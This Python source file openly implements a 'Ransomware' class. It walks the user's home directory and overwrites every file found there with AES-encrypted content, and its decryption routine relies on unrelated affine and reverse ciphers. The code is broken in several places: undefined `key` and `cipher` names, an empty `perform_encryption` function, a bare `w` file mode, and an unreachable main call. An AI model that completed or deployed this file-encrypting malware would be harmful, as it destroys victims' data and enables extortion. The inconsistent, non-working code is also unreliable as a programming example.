import os
import os.path
from os import listdir
from os.path import isfile, join
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes


from AffineCipher import *
from ReverseCipher import *

'''

Ransomware class

In here you'll find the individual ciphers implemented together, encryption/decryption functions and file handling functions
Debug messages along with any code that doesn't work/isn't being used has been commented out

'''

class Ransomware(object):

    def __init__(self, dev_mode):
        self.dev_mode = dev_mode
        self.key = get_random_bytes(16)
        if dev_mode == True:
            with open("AES_key.txt", w) as f:
                f.write(key)
                f.close()
            

    ######## Encryption functions ######## 

    def perform_encryption(self, message):
        

        return ciphertext, tag

    def encrypt_file(self, filename):
        aes_cipher = AES.new(key, AES.MODE_EAX)
        # Open file as Read-Binary, read its contents and store in f_contents
        with open(filename, 'rb') as f:
            f_contents = f.read()
        ciphertext, tag = cipher.encrypt_and_digest(f_contents)
        f.close()

        # Save encrypted contents to file
        with open(filename, 'wb') as f:
            [ f.write(x) for x in (cipher.nonce, tag, ciphertext) ]
            f.close()

    def encrypt_files(self):
        list_of_files = self.get_list_of_files() 

        for each_file in list_of_files:
            self.encrypt_file(each_file)
    

    ######## Decryption functions ######## 

    # This function is the same as the perform_encryption fuction 
    # but the opposite way round to retrieve the plaintext/original contents of the file
    def perform_decryption(self, key, message):
        reverse = ReverseCipher()
        affine = AffineCipher()
 
        # Round 1: Reverse (Transposition)
        # Round 2: Affine (Substitution)
        reverse_message = reverse.reverse(message)  
        affine_message = affine.decryptMessage(key, reverse_message)       
        plaintext = affine_message 
        
        return plaintext

    def decrypt_file(self, filename):
        # Open file as Read-Binary, read contents and store in f_contents
        with open(filename, 'rb') as f:
            f_contents = f.read()
        plaintext = self.perform_decryption(self.key, f_contents)
        f.close()

        # Save the original contents to the file
        with open(filename, 'wb') as f:
            f.write(plaintext)
            f.close()

    def decrypt_files(self):
        # Get the files to be decrypted
        list_of_files = self.get_list_of_files()

        # Decrypt every file in the list individually 
        for each_file in list_of_files:
            self.decrypt_file(each_file)            

    
    ######## Helper functions ######## 

    # Returns all files from a specified directory tree
    def get_list_of_files(self):
        if dev_mode == True:
            path = "ENTER LOCAL DIRECTORY HERE TO TEST"
        elif dev_mode == False:
            # Cross platform way of getting home directory
            path = os.path.expanduser('~user')
        
        list_of_files = []

        # os.walk generates the file names in a directory tree by walking the tree
        # Directory -> Sub directories -> Files inside those subdirectories
        # Gets all files at given path
        for directory, subDirectories, files in os.walk(path):
            for filename in files:
                list_of_files.append(directory + "\\" + filename)       
        return list_of_files

        if __name__ == '__main__':self.main()
